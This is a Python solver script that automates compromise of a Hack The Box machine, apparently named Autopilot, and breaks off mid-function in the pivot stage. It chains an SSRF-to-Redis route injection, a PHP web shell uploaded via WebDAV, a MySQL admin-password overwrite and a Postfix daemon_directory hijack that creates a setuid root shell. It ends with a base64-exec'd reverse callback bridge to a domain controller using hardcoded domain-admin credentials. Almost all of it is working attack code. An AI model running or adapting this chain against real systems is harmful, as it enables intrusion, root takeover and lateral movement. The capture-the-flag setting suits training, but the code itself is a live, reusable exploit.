#!/usr/bin/env python3
"""Solve a fresh HTB Autopilot instance with only its external IP.

Usage: python3 autopilot_solve.py 10.129.x.x

The attacker machine needs a route to the HTB target, a reachable callback
address on that route, and Python 3.9+ with pip. Missing Python packages are
installed into temporary, private directories. The Redis route, Seafile
account, WebDAV payload, Postfix changes, and bridge are removed afterward;
the mock draft and imported EML may remain in Deborah's mailbox.
"""

from __future__ import annotations

import argparse
import atexit
import importlib
import logging
import re
import shutil
import subprocess
import sys
import tempfile


_dependency_dirs = []


def ensure_package(module: str, *packages: str) -> None:
    try:
        importlib.import_module(module)
        return
    except ImportError:
        pass
    folder = tempfile.mkdtemp(prefix="autopilot-python-deps-")
    _dependency_dirs.append(folder)
    atexit.register(shutil.rmtree, folder, ignore_errors=True)
    print(f"Installing missing Python dependency: {packages[0]}", file=sys.stderr)
    subprocess.check_call([
        sys.executable, "-m", "pip", "install", "--quiet",
        "--disable-pip-version-check", "--target", folder, *packages,
    ])
    sys.path.insert(0, folder)
    importlib.import_module(module)


ensure_package("requests", "requests>=2.31,<3", "urllib3<2")

# --- Web foothold ---
"""Autopilot CTF web foothold: Deborah -> Redis route -> grofiles RCE.

This module is intentionally specific to the HTB Autopilot appliance.  The
public API for the complete solver is::

    foothold = Foothold(target_ip)
    foothold.setup()
    print(foothold.rce("id"))
    foothold.cleanup()

`rce()` refreshes the short-lived Redis route when needed.  The only required
input is the active HTB box IP; the machine-provided Deborah credential and
the route layout are constants from this challenge.
"""


import argparse
import json
import logging
import os
import secrets
import time
from email.message import EmailMessage
from email.policy import SMTP
from urllib.parse import quote_from_bytes

import requests
from requests.auth import HTTPBasicAuth


LOG = logging.getLogger(__name__)
USERNAME = "deborah.hernandez"
PASSWORD = "8F5cgp@tC8g@"
HOST = "mail.autopilot.htb"
REPOSITORY_ID = "11111111-1111-1111-1111-111111111111"
CACHE_PREFIX = "0080d9f8020c1c045f3ae6468d0c933a"
WEB_SHELL_NAME = "rclprobe.txt"
WEB_SHELL_PATH = (
    "/var/lib/grommunio-files/data/deborah.hernandez/files/" + WEB_SHELL_NAME
)
WEB_SHELL = (
    b'<?php header("Content-Type: text/plain"); '
    b'$c=$_GET["cmd"]??"id"; @passthru($c." 2>&1"); ?>'
)


class FootholdError(RuntimeError):
    """Raised when a required response differs from the recorded CTF flow."""


def _redis_command(*values: object) -> bytes:
    parts = [f"*{len(values)}\r\n".encode()]
    for value in values:
        item = str(value).encode()
        parts.extend((f"${len(item)}\r\n".encode(), item, b"\r\n"))
    return b"".join(parts)


def _gopher(*commands: tuple[object, ...]) -> str:
    wire = b"".join(_redis_command(*command) for command in commands)
    return "gopher://127.0.0.1:6379/_" + quote_from_bytes(wire, safe="")


class Foothold:
    """Authenticated SSRF/Redis route foothold against one Autopilot instance."""

    def __init__(
        self,
        target_ip: str,
        *,
        timeout: float = 35,
        route_ttl: int = 120,
        cache_prefix: str = CACHE_PREFIX,
    ) -> None:
        if not target_ip or ":" in target_ip or "/" in target_ip:
            raise ValueError("target_ip must be one IPv4 address")
        self.target_ip = target_ip
        self.base = f"https://{target_ip}/"
        self.timeout = timeout
        self.route_ttl = route_ttl
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update(
            {"Host": HOST, "User-Agent": requests.utils.default_user_agent()}
        )
        self.account_id: str | None = None
        self._route_set_at = 0.0
        self._ready = False
        self._uploaded = False

        key = (
            f"{cache_prefix}/route{HOST}#/files/index.php#rootCollection"
        )
        route = [
            False,
            {
                "/ctf": [[
                    {"_route": "ctf", "file": WEB_SHELL_PATH},
                    None, {"GET": 0}, None, False, False, None,
                ]]
            },
            [], {}, None,
        ]
        route_json = json.dumps(route, separators=(",", ":"))
        self._exec_url = _gopher(
            ("SETEX", key, route_ttl, route_json), ("QUIT",)
        )
        self._del_url = _gopher(("DEL", key), ("QUIT",))

    def _post_webapp(self, action: dict) -> dict:
        suffix = f"web/grommunio.php?subsystem=webapp_{int(time.time() * 1000)}"
        response = self.session.post(
            self.base + suffix,
            json={"grommunio": action},
            timeout=self.timeout,
        )
        response.raise_for_status()
        try:
            return response.json()
        except ValueError as exc:
            raise FootholdError(
                f"Grommunio Web returned non-JSON ({response.status_code}): "
                + response.text[:300]
            ) from exc

    def _login(self) -> None:
        response = self.session.post(
            self.base + "web/?logon",
            data={"username": USERNAME, "password": PASSWORD},
            timeout=self.timeout,
        )
        response.raise_for_status()
        if not self.session.cookies:
            raise FootholdError("Deborah login did not set a Web session cookie")
        LOG.info("Deborah Web session established")

    def _upload_web_shell(self) -> None:
        response = self.session.put(
            self.base + f"files/remote.php/dav/files/{USERNAME}/{WEB_SHELL_NAME}",
            data=WEB_SHELL,
            auth=HTTPBasicAuth(USERNAME, PASSWORD),
            timeout=self.timeout,
        )
        if response.status_code not in (200, 201, 204):
            raise FootholdError(
                f"WebDAV upload failed: HTTP {response.status_code} "
                + response.text[:300]
            )
        self._uploaded = True
        LOG.info("WebDAV PHP text file uploaded (%s)", response.status_code)

    def _bootstrap_draft(self) -> tuple[str, str]:
        """Make a normal draft to obtain the mailbox's store/folder IDs."""
        dialog = "mockattach" + secrets.token_hex(11)
        files = [
            ("attachments[]", ("ping.json", b'"pong"', "application/json")),
            (
                "attachments[]",
                (
                    "repos.json",
                    json.dumps([
                        {
                            "type": "repo", "name": "mock",
                            "id": REPOSITORY_ID, "mtime": 0,
                        }
                    ]).encode(),
                    "application/json",
                ),
            ),
            (
                "attachments[]",
                (
                    "file.json",
                    json.dumps("http://127.0.0.1/statusmonitor").encode(),
                    "application/json",
                ),
            ),
        ]
        response = self.session.post(
            self.base + "web/index.php",
            params={
                "load": "upload_attachment",
                "dialog_attachments": dialog,
                "module": "createmailitemmodule", "moduleid": "1",
            },
            data={
                "dialog_attachments": dialog,
                "ignore_extract_attachid": "true",
            },
            files=files,
            timeout=self.timeout,
        )
        response.raise_for_status()
        try:
            uploaded = response.json()["grommunio"]["createmailitemmodule"]["1"]["update"]["item"]
            if len(uploaded) != 3:
                raise ValueError(f"expected 3 uploaded parts; got {len(uploaded)}")
            locations = [
                "mock/api2/ping/",
                "mock/api2/repos/",
                f"mock/api2/repos/{REPOSITORY_ID}/file/?p=/foo",
            ]
            attachments = [
                {
                    "inline": True,
                    "tmpname": item["props"]["tmpname"],
                    "cid": location,
                }
                for item, location in zip(uploaded, locations)
            ]
            saved = self._post_webapp({
                "createmailitemmodule": {"1": {"save": {
                    "props": {
                        "message_class": "IPM.Note",
                        "subject": "Seafile mock " + dialog,
                    },
                    "attachments": {
                        "dialog_attachments": dialog,
                        "add": attachments,
                    },
                }}}
            })
            item = saved["grommunio"]["createmailitemmodule"]["1"]["update"]["item"]
            store, folder = item["store_entryid"], item["parent_entryid"]
        except (KeyError, TypeError, ValueError, IndexError) as exc:
            raise FootholdError("Could not create/read Grommunio draft") from exc
        LOG.info("Mailbox draft prepared")
        return store, folder

    def _import_mock_eml(self, store: str, folder: str) -> str:
        message = EmailMessage(policy=SMTP.clone(max_line_length=998))
        message["From"] = message["To"] = f"{USERNAME}@autopilot.htb"
        message["Subject"] = "Autopilot mock Seafile API"
        message.set_content("Autopilot mock Seafile API")
        responses = [
            ("mock/api2/ping/", json.dumps("pong")),
            (
                "mock/api2/repos/",
                json.dumps([
                    {
                        "type": "repo", "name": "mock",
                        "id": REPOSITORY_ID, "mtime": 0,
                    }
                ]),
            ),
            (
                f"mock/api2/repos/{REPOSITORY_ID}/file/?p=/route_exec",
                json.dumps(self._exec_url),
            ),
            (
                f"mock/api2/repos/{REPOSITORY_ID}/file/?p=/route_del",
                json.dumps(self._del_url),
            ),
        ]
        for location, body in responses:
            message.add_attachment(
                body.encode(),
                maintype="application", subtype="json", filename="data.json",
            )
            message.get_payload()[-1]["Content-Location"] = location

        dialog = "mockattach" + secrets.token_hex(12)
        params = {
            "load": "upload_attachment", "module": "createmailitemmodule",
            "moduleid": "1", "dialog_attachments": dialog,
            "store": store, "destination_folder": folder,
            "import": "1", "ignore_extract_attachid": "true",
        }
        response = self.session.post(
            self.base + "web/index.php",
            params=params, data=params,
            files=[(
                "attachments[]",
                ("mock-seafile.eml", message.as_bytes(), "message/rfc822"),
            )],
            timeout=max(self.timeout, 45),
        )
        response.raise_for_status()
        try:
            entry_id = response.json()["grommunio"]["createmailitemmodule"]["1"]["import"]["items"]
        except (ValueError, KeyError, TypeError) as exc:
            raise FootholdError(
                "EML import failed: " + response.text[:500]
            ) from exc
        if not isinstance(entry_id, str) or not entry_id:
            raise FootholdError(f"EML import returned invalid entry ID: {entry_id!r}")
        LOG.info("Mock Seafile EML imported")
        return entry_id

    def _create_account(self, store: str, entry_id: str) -> None:
        cookie = "; ".join(f"{key}={value}" for key, value in self.session.cookies.items())
        config = {
            "server_address": HOST,
            "server_port": "443",
            "server_ssl": "1",
            "server_path": (
                "web/index.php?load=download_attachment&store="
                + store + "&entryid=" + entry_id + "&attachCid=mock"
            ),
            "user": "@auth:token:deborah",
            "password": (
                "x\r\nCookie: " + cookie
                + "\r\nUser-Agent: "
                + requests.utils.default_user_agent()
            ),
            "use_grommunio_credentials": "0",
        }
        # The recorded run first created a preliminary account and then
        # updated it with this configuration.  Creating it directly here is
        # equivalent at the same filesaccountmodule save API.
        result = self._post_webapp({
            "filesaccountmodule": {"1": {"save": {"props": {
                "name": "mock-seafile-relay-" + secrets.token_hex(3),
                "backend": "Seafile",
                "backend_config": config,
            }}}}
        })
        try:
            item = result["grommunio"]["filesaccountmodule"]["1"]["update"]["item"][0]
            self.account_id = item["entryid"]
            status = item["props"].get("status")
        except (KeyError, TypeError, IndexError) as exc:
            raise FootholdError("Seafile account creation returned no account ID") from exc
        LOG.info("Seafile account created: status=%s", status)
        if status != "ok":
            # The first save is allowed to return an account ID with status
            # err.  The verified run's subsequent update made it healthy.
            result = self._post_webapp({
                "filesaccountmodule": {"1": {"save": {
                    "entryid": self.account_id,
                    "props": {"backend_config": config},
                }}}
            })
            try:
                item = result["grommunio"]["filesaccountmodule"]["1"]["update"]["item"][0]
                status = item["props"].get("status")
            except (KeyError, TypeError, IndexError) as exc:
                raise FootholdError("Seafile account update did not return status") from exc
        if status != "ok":
            desc = item["props"].get("status_description", "")
            raise FootholdError(f"Seafile account unhealthy: {status} {desc}")
        LOG.info("Seafile account healthy")

    def _trigger(self, name: str) -> dict:
        if not self.account_id:
            raise FootholdError("No Seafile account exists")
        return self._post_webapp({
            "filesbrowsermodule": {"1": {"downloadtotmp": {
                "ids": [f"#R#{self.account_id}/mock/{name}"],
                "dialog_attachments": "test" + secrets.token_hex(14),
            }}}
        })

    def refresh_route(self) -> None:
        """Send one authenticated Seafile SSRF request to SETEX the route."""
        reply = self._trigger("route_exec")
        module = reply.get("grommunio", {}).get("filesbrowsermodule", {}).get("1", {})
        error = module.get("error", {})
        if error:
            text = error.get("info", {}).get("original_message", "")
            # A Redis response is not a Seafile file.  The original working
            # trigger returned UNKNOWN_PHRASE while the Redis side effect ran.
            LOG.debug("Seafile download returned expected parser error: %s", text)
        self._route_set_at = time.monotonic()

    def setup(self) -> "Foothold":
        """Run the one-time login/upload/draft/import/account setup."""
        if self._ready:
            return self
        self._login()
        self._upload_web_shell()
        store, folder = self._bootstrap_draft()
        entry = self._import_mock_eml(store, folder)
        self._create_account(store, entry)
        self._ready = True
        self.refresh_route()
        proof = self.rce("id", refresh=False)
        if "grofiles" not in proof:
            raise FootholdError("Route did not execute as grofiles: " + proof[:300])
        LOG.info("Confirmed grofiles command execution")
        return self

    def rce(self, command: str, *, refresh: bool = True) -> str:
        """Execute a shell command as grofiles and return combined output."""
        if not self._ready:
            raise FootholdError("Call setup() before rce()")
        if refresh and time.monotonic() - self._route_set_at > self.route_ttl - 25:
            self.refresh_route()
        response = self.session.get(
            self.base + "files/index.php/ctf",
            params={"cmd": command},
            timeout=max(self.timeout, 55),
            allow_redirects=False,
        )
        if response.status_code != 200 and refresh:
            self.refresh_route()
            response = self.session.get(
                self.base + "files/index.php/ctf",
                params={"cmd": command},
                timeout=max(self.timeout, 55),
                allow_redirects=False,
            )
        if response.status_code != 200:
            raise FootholdError(
                f"Webshell HTTP {response.status_code}: {response.text[:300]}"
            )
        return response.text

    def cleanup(self, *, delete_web_shell: bool = False) -> None:
        """Best-effort route/account deletion and optional WebDAV file removal."""
        if self.account_id:
            try:
                self._trigger("route_del")
                self._route_set_at = 0.0
            except Exception as exc:
                LOG.warning("Could not trigger Redis DEL: %s", exc)
            try:
                reply = self._post_webapp({
                    "filesaccountmodule": {"1": {"delete": {
                        "entryid": self.account_id,
                    }}}
                })
                outcome = reply.get("grommunio", {}).get(
                    "filesaccountmodule", {}
                ).get("1", {}).get("delete", {})
                if not outcome.get("status"):
                    LOG.warning("Seafile account deletion was not confirmed: %s", outcome)
            except Exception as exc:
                LOG.warning("Could not delete Seafile account: %s", exc)
            self.account_id = None
        if delete_web_shell and self._uploaded:
            try:
                # Use a fresh DAV request.  Reusing the Web session's Files
                # cookies caused this appliance to answer 412 even with
                # If-Match: *, whereas basic-auth-only DAV deletion succeeds.
                response = requests.delete(
                    self.base + f"files/remote.php/dav/files/{USERNAME}/{WEB_SHELL_NAME}",
                    auth=HTTPBasicAuth(USERNAME, PASSWORD),
                    headers={"Host": HOST, "If-Match": "*"},
                    verify=False,
                    timeout=self.timeout,
                )
                if response.status_code not in (200, 204, 404):
                    LOG.warning("WebDAV delete returned HTTP %s", response.status_code)
                else:
                    self._uploaded = False
            except Exception as exc:
                LOG.warning("Could not delete WebDAV file: %s", exc)


# --- Linux privilege escalation ---
"""Autopilot CTF: upgrade the Grommunio Files command runner to Linux root.

The caller supplies a working ``rce(command) -> stdout`` function for the
authenticated Files route. ``run()`` leaves the root shell in place for the
internal-network phase; ``cleanup()`` restores the account/configuration and
removes the temporary files. This module never reads or prints flag values.
"""


import base64
import json
import re
import secrets
import shlex
import time
from dataclasses import dataclass
from typing import Callable


FILES = "/var/lib/grommunio-files/data/deborah.hernandez/files"
POSTFIX_DEFAULT = "/usr/lib/postfix/bin/"
ADMIN_API = "http://127.0.0.1:8080/api/v1"


class EscalationError(RuntimeError):
    """An expected Autopilot escalation step did not produce its proof."""


@dataclass(frozen=True)
class ConfigValue:
    row_id: int
    value_hex: str | None


class RootEscalator:
    """Run the verified Admin API/Postfix escalation through a Files RCE.

    ``rce`` must refresh the short-lived Redis route when necessary and return
    command output as text. It should raise on transport failure.
    """

    def __init__(self, rce: Callable[[str], str], target_ip: str | None = None):
        self.rce = rce
        self.target_ip = target_ip
        nonce = secrets.token_hex(4)
        self.stage = f"{FILES}/ctf-postfix-{nonce}"
        self.shell = f"{FILES}/.ctf-rootbash-{nonce}"
        self.proof = f"{FILES}/ctf-root-proof-{nonce}"
        self.db_user = "grommunio"
        self.db_name = "grommunio"
        self.db_password: str | None = None
        self.temporary_password: str | None = None
        self.original_admin_hex: str | None = None
        self.original_daemon_directory: str | None = None
        self.original_configs: dict[tuple[str, str, str], ConfigValue | None] = {}
        self.jwt: str | None = None
        self.csrf: str | None = None
        self.changed_admin = False
        self.changed_config = False
        self.staged = False
        self.succeeded = False

    def _output(self, command: str) -> str:
        value = self.rce(command)
        if isinstance(value, bytes):
            value = value.decode("utf-8", "replace")
        if not isinstance(value, str):
            raise EscalationError("RCE callback did not return text")
        return value

    def _mysql(self, statement: str, *, require_ok: bool = False) -> str:
        if not self.db_password:
            raise EscalationError("MySQL password is unknown")
        command = (
            "mysql -h127.0.0.1 "
            + shlex.quote("-u" + self.db_user)
            + " "
            + shlex.quote("-p" + self.db_password)
            + " -N -B "
            + shlex.quote(self.db_name)
            + " -e "
            + shlex.quote(statement)
            + " 2>&1"
        )
        if require_ok:
            command += " && printf '\\n__MYSQL_OK__\\n'"
        output = self._output(command)
        output = "\n".join(
            line for line in output.splitlines()
            if not re.match(r"^(?:mysql|mariadb):\s*\[Warning\]", line)
        )
        if "ERROR " in output or (require_ok and "__MYSQL_OK__" not in output):
            raise EscalationError("MySQL operation failed: " + output[:500])
        return output.replace("__MYSQL_OK__", "").strip()

    def _discover_database(self) -> None:
        output = self._output(
            "cat /etc/postfix/grommunio-virtual-mailbox-maps.cf "
            "/etc/postfix/grommunio-virtual-mailbox-domains.cf"
        )
        fields = dict(
            (key.lower(), value.strip())
            for key, value in re.findall(r"(?m)^\s*(user|password|dbname)\s*=\s*([^\r\n#]+)", output)
        )
        if fields.get("user") != "grommunio" or not fields.get("password"):
            raise EscalationError("Grommunio MySQL credential not found in Postfix config")
        self.db_user = fields["user"]
        self.db_password = fields["password"]
        self.db_name = fields.get("dbname", "grommunio")

    def _config_snapshot(self, service: str, file: str, key: str) -> ConfigValue | None:
        statement = (
            "SELECT id,HEX(value) FROM configs WHERE service="
            + self._sql_literal(service)
            + " AND file="
            + self._sql_literal(file)
            + " AND `key`="
            + self._sql_literal(key)
        )
        rows = [line.strip() for line in self._mysql(statement).splitlines() if line.strip()]
        if not rows:
            return None
        if len(rows) != 1:
            raise EscalationError(f"Expected one config row for {service}/{file}/{key}")
        columns = rows[0].split("\t")
        if len(columns) != 2 or not columns[0].isdigit():
            raise EscalationError("Unexpected Grommunio config row format")
        value_hex = None if columns[1] == "NULL" else columns[1]
        return ConfigValue(int(columns[0]), value_hex)

    @staticmethod
    def _sql_literal(value: str) -> str:
        return "'" + value.replace("'", "''") + "'"

    def _snapshot(self) -> None:
        output = self._mysql("SELECT HEX(password) FROM users WHERE id=0")
        match = re.search(r"(?m)^([0-9A-F]+)$", output)
        if not match:
            raise EscalationError("Could not save the original admin password hash")
        self.original_admin_hex = match.group(1)
        daemon_output = self._output("/usr/sbin/postconf -h daemon_directory")
        daemon_lines = [line.strip() for line in daemon_output.splitlines() if line.strip()]
        if not daemon_lines:
            raise EscalationError("Could not save original Postfix daemon_directory")
        self.original_daemon_directory = daemon_lines[-1]
        for item in (
            ("grommunio-dbconf", "postfix", "commit_file"),
            ("postfix", "ctf", "daemon_directory"),
        ):
            self.original_configs[item] = self._config_snapshot(*item)

    def _new_password_hash(self, password: str) -> str:
        output = self._output("openssl passwd -6 " + shlex.quote(password))
        match = re.search(r"\$6\$[^\s]+", output)
        if not match:
            raise EscalationError("OpenSSL did not produce a SHA-512-crypt hash")
        return match.group(0)

    def _login(self) -> None:
        if self.temporary_password is None:
            raise EscalationError("Temporary Admin API password is not set")
        command = (
            "curl -ksSf --max-time 15 -H 'Host: mail.autopilot.htb' "
            "--data-urlencode 'user=admin' --data-urlencode "
            + shlex.quote("pass=" + self.temporary_password)
            + " "
            + shlex.quote(ADMIN_API + "/login")
        )
        output = self._output(command)
        try:
            data = json.loads(output[output.index("{") : output.rindex("}") + 1])
            self.jwt = data["grommunioAuthJwt"]
            self.csrf = data["csrf"]
        except (ValueError, KeyError) as exc:
            raise EscalationError("Admin API login failed: " + output[:400]) from exc

    def _patch(self, resource: str, data: dict[str, str]) -> str:
        if not self.jwt or not self.csrf:
            self._login()
        command = (
            "curl -ksSf --max-time 35 -X PATCH "
            "-H 'Host: mail.autopilot.htb' "
            "-H 'Content-Type: application/json' "
            "-H "
            + shlex.quote("Cookie: grommunioAuthJwt=" + self.jwt)
            + " -H "
            + shlex.quote("X-Csrf-Token: " + self.csrf)
            + " --data "
            + shlex.quote(json.dumps({"data": data}, separators=(",", ":")))
            + " "
            + shlex.quote(ADMIN_API + "/system/dbconf/" + resource)
        )
        return self._output(command)

    def _stage_script(self) -> None:
        script = f"""#!/bin/sh
/usr/bin/id > {shlex.quote(self.proof)}
/usr/bin/cp /bin/bash {shlex.quote(self.shell)}
/usr/bin/chown root:root {shlex.quote(self.shell)}
/usr/bin/chmod 4755 {shlex.quote(self.shell)}
/usr/sbin/postconf -e "daemon_directory = {POSTFIX_DEFAULT}"
exec {POSTFIX_DEFAULT.rstrip('/')}/postfix-script "$@"
"""
        encoded = base64.b64encode(script.encode()).decode()
        command = (
            "mkdir -p "
            + shlex.quote(self.stage)
            + " && printf %s "
            + shlex.quote(encoded)
            + " | base64 -d > "
            + shlex.quote(self.stage + "/postfix-script")
            + " && chmod 755 "
            + shlex.quote(self.stage + "/postfix-script")
            + " && test -x "
            + shlex.quote(self.stage + "/postfix-script")
            + " && echo __STAGED__"
        )
        self.staged = True  # Remove even a partially written script on failure.
        output = self._output(command)
        if "__STAGED__" not in output:
            raise EscalationError("Could not stage Postfix script: " + output[:500])

    def _root_works(self) -> bool:
        result = self._output(
            shlex.quote(self.shell) + " -p -c 'id -u' 2>&1"
        )
        return bool(re.search(r"(?m)^0\s*$", result))

    def run(self) -> str:
        """Escalate and return the absolute setuid root-shell path.

        On success the shell is intentionally retained for the caller's DC
        pivot. The caller must invoke ``cleanup()`` in a ``finally`` block.
        """
        if self.succeeded:
            return self.shell
        try:
            self._discover_database()
            self._snapshot()
            self.temporary_password = "Auto!" + secrets.token_urlsafe(16)
            new_hash = self._new_password_hash(self.temporary_password)
            self.changed_admin = True  # Restore even if the response is lost.
            self._mysql(
                "UPDATE users SET password=UNHEX('"
                + new_hash.encode().hex()
                + "') WHERE id=0",
                require_ok=True,
            )
            self._login()
            self._stage_script()
            self.changed_config = True  # API may commit before a response fails.
            self._patch("grommunio-dbconf/postfix/", {"commit_file": "#POSTCONF"})
            try:
                self._patch("postfix/ctf/", {"daemon_directory": self.stage})
            except Exception:
                # The tested API can report a commit error after executing the
                # beginning of postfix-script. The filesystem proof decides.
                pass
            for _ in range(6):
                if self._root_works():
                    break
                time.sleep(2)
            else:
                raise EscalationError("Postfix script did not create a working root shell")
            self.succeeded = True
            return self.shell
        except Exception:
            try:
                self.cleanup()
            except Exception:
                pass
            raise

    def root(self, command: str) -> str:
        """Execute a shell command as effective UID 0 after ``run()``."""
        if not self.succeeded or not self._root_works():
            raise EscalationError("Root shell has not been verified")
        return self._output(shlex.quote(self.shell) + " -p -c " + shlex.quote(command))

    def cleanup(self) -> None:
        """Restore Admin API/DB configuration and remove escalation files."""
        failures: list[str] = []
        if self.db_password and self.changed_config:
            try:
                if self.changed_admin:
                    self._login()  # Refresh JWT if the pivot took a long time.
                self._patch(
                    "postfix/ctf/",
                    {"daemon_directory": self.original_daemon_directory or POSTFIX_DEFAULT},
                )
            except Exception as exc:
                failures.append("Postfix API reset: " + str(exc))
            try:
                reset_command = (
                    "/usr/sbin/postconf -e "
                    + shlex.quote(
                        "daemon_directory = "
                        + (self.original_daemon_directory or POSTFIX_DEFAULT)
                    )
                )
                if self._root_works():
                    self._output(
                        shlex.quote(self.shell) + " -p -c "
                        + shlex.quote(reset_command)
                    )
            except Exception:
                # The target script itself performed this reset as root.
                pass
            for (service, file, key), old in self.original_configs.items():
                where = (
                    "service=" + self._sql_literal(service)
                    + " AND file=" + self._sql_literal(file)
                    + " AND `key`=" + self._sql_literal(key)
                )
                try:
                    if old is None:
                        self._mysql("DELETE FROM configs WHERE " + where, require_ok=True)
                    else:
                        expression = (
                            "NULL" if old.value_hex is None
                            else "UNHEX('" + old.value_hex + "')"
                        )
                        self._mysql(
                            "UPDATE configs SET value=" + expression
                            + " WHERE id=" + str(old.row_id),
                            require_ok=True,
                        )
                except Exception as exc:
                    failures.append(f"Config restore {service}/{file}/{key}: {exc}")
            self.changed_config = False

        if self.db_password and self.changed_admin and self.original_admin_hex:
            try:
                self._mysql(
                    "UPDATE users SET password=UNHEX('"
                    + self.original_admin_hex
                    + "') WHERE id=0",
                    require_ok=True,
                )
                self.changed_admin = False
            except Exception as exc:
                failures.append("Admin password restore: " + str(exc))

        if self.staged:
            try:
                self._output(
                    "rm -f " + shlex.quote(self.shell) + " " + shlex.quote(self.proof)
                    + " && rm -rf " + shlex.quote(self.stage)
                )
                self.staged = False
                self.succeeded = False
            except Exception as exc:
                failures.append("Temporary-file removal: " + str(exc))
        if failures:
            raise EscalationError("Cleanup incomplete: " + "; ".join(failures))


# --- DC pivot ---
"""Read Autopilot's DC flag through a short-lived reverse SMB bridge.

The calling solver supplies a function that runs one shell command as root on
the compromised Grommunio host. No callback address or SSH service is needed:
the source address of the route to the HTB target is used automatically.
"""


import base64
import atexit
import importlib
import secrets
import shlex
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
from collections.abc import Callable


DOMAIN = "AUTOPILOT"
DA_USER = "da-stephanie.lewis"
DA_PASSWORD = "krFqXfDI1y4331"
DC_IP = "172.16.20.1"
ROOT_PATH = r"Users\Administrator\Desktop\root.txt"


def _smb_connection_class():
    """Load Impacket, installing it into private temporary storage if needed.

    This does not modify the user's site packages or system Python. The
    temporary package tree is removed when the solver process exits.
    """
    try:
        from impacket.smbconnection import SMBConnection

        return SMBConnection
    except ImportError:
        pass

    package_dir = tempfile.mkdtemp(prefix="autopilot-impacket-")
    command = [
        sys.executable,
        "-m",
        "pip",
        "install",
        "--disable-pip-version-check",
        "--no-input",
        "--target",
        package_dir,
        "impacket",
    ]
    try:
        completed = subprocess.run(
            command,
            check=False,
            capture_output=True,
            text=True,
            timeout=240,
        )
        if completed.returncode:
            detail = (completed.stderr or completed.stdout).strip()[-1000:]
            raise RuntimeError(f"Could not install private Impacket: {detail}")
        sys.path.insert(0, package_dir)
        importlib.invalidate_caches()
        module = importlib.import_module("impacket.smbconnection")
    except Exception:
        if package_dir in sys.path:
            sys.path.remove(package_dir)
        shutil.rmtree(package_dir, ignore_errors=True)
        raise
    atexit.register(shutil.rmtree, package_dir, ignore_errors=True)
    return module.SMBConnection


def _route_source_ip(target_ip: str) -> str:
    """Return the local VPN address selected for traffic to the target."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
        probe.connect((target_ip, 443))
        return probe.getsockname()[0]


def _agent_source(
    callback_ip: str, callback_port: int, dc_ip: str, token: bytes, dc_port: int = 445
) -> str:
    """Build a target-side one-shot TCP bridge to DC SMB.

    The agent sends a 16-byte random token and one status byte before SMB
    traffic, so the listener can reject unrelated callback connections.
    """
    return f'''\
import select
import socket
import time

callback = ({callback_ip!r}, {callback_port})
destination = ({dc_ip!r}, {dc_port})
token = bytes.fromhex({token.hex()!r})

with socket.create_connection(callback, timeout=15) as tunnel:
    try:
        remote = socket.create_connection(destination, timeout=15)
    except OSError:
        tunnel.sendall(token + b"\\x01")
        raise
    with remote:
        tunnel.sendall(token + b"\\x00")
        tunnel.settimeout(None)
        remote.settimeout(None)
        sockets = [tunnel, remote]
        deadline = time.monotonic() + 100
        while time.monotonic() < deadline:
            readable, _, _ = select.select(sockets, [], [], 1)
            for src in readable:
                data = src.recv(65536)
                if not data:
                    raise SystemExit(0)
                dst = remote if src is tunnel else tunnel
                dst.sendall(data)
'''


def _pump(left: socket.socket, right: socket.socket, stop: threading.Event) -> None:
    """Copy one local SMB TCP session to the target callback."""
    try:
        left.settimeout(0.5)
        right.settimeout(0.5)
        while not stop.is_set():
            import select

            readable, _, _ = select.select((left, right), (), (), 0.5)
            for src in readable:
                try:
                    data = src.recv(65536)
                except (BlockingIOError, socket.timeout):
                    continue
                if not data:
                    return
                dst = right if src is left else left
                dst.sendall(data)
    except OSError:
        return
    finally:
        stop.set()
        for conn in (left, right):
            try:
                conn.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                conn.close()
            except OSError:
                pass


class DCPivot:
    """Create a one-shot reverse bridge and download DC01's root.txt.

    ``root_exec(command)`` must execute a shell command as root on the Linux
    target and return its output. The solver need only pass the external HTB IP.
    """

    def __init__(
        self,
        root_exec: Callable[[str], str],
        target_ip: str,
        *,
        dc_ip: str = DC_IP,
        dc_port: int = 445,
        callback_ip: str | None = None,
        callback_timeout: float = 45.0,
    ) -> None:
        self.root_exec = root_exec
        self.target_ip = target_ip
        self.dc_ip = dc_ip
        self.dc_port = dc_port
        self.callback_ip = callback_ip or _route_source_ip(target_ip)
        self.callback_timeout = callback_timeout

    def _start_agent(self, ip: str, port: int, token: bytes) -> str:
        unit = "ctf-autopilot-smb-" + token.hex()[:10]
        source = _agent_source(ip, port, self.dc_ip, token, self.dc_port)
        encoded = base64.b64encode(source.encode()).decode()
        runner = f"import base64;exec(base64.b64decode({encoded!r}))"
        command = (
            "/usr/bin/setpriv --reuid=0 --regid=0 --clear-groups "
            f"/usr/bin/systemd-run --unit={shlex.quote(unit)} --collect --no-block "
            f"/usr/bin/timeout 110 /usr/bin/python3 -c {shlex.quote(runner)}"
        )
        output = self.root_exec(command)
        if "Failed to" in output or "failed to" in output:
            raise RuntimeError(f"Could not start target SMB bridge: {output.strip()}")
        return unit

    def read_root_flag(self) -> str:
        """Return the DC flag contents, leaving no persistent tunnel service."""
        SMBConnection = _smb_connection_class()

        token = secrets.token_bytes(16)
        callback = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        callback.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        callback.bind((self.callback_ip, 0))
        callback.listen(1)
        callback.settimeout(self.callback_timeout)
        front = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        front.bind(("127.0.0.1", 0))
        front.listen(1)
        front.settimeout(25)
        unit: str | None = None
        remote: socket.socket | None = None
        bridge_thread: threading.Thread | None = None
        stopped = threading.Event()
        try:
            unit = self._start_agent(
                self.callback_ip, callback.getsockname()[1], token
            )
            try:
                remote, _ = callback.accept()
            except socket.timeout as exc:
                raise RuntimeError(
                    "No reverse SMB callback reached "
                    f"{self.callback_ip}:{callback.getsockname()[1]} "
                    f"from the target within {self.callback_timeout:.0f}s"
                ) from exc
            remote.settimeout(15)
            header = bytearray()
            while len(header) < 17:
                chunk = remote.recv(17 - len(header))
                if not chunk:
                    raise RuntimeError("Target SMB bridge closed during handshake")
                header.extend(chunk)
            if bytes(header[:16]) != token:
                raise RuntimeError("Unexpected callback on the SMB bridge")
            if header[16] != 0:
                raise RuntimeError(
                    f"Target cannot connect to DC SMB at {self.dc_ip}:{self.dc_port}"
                )
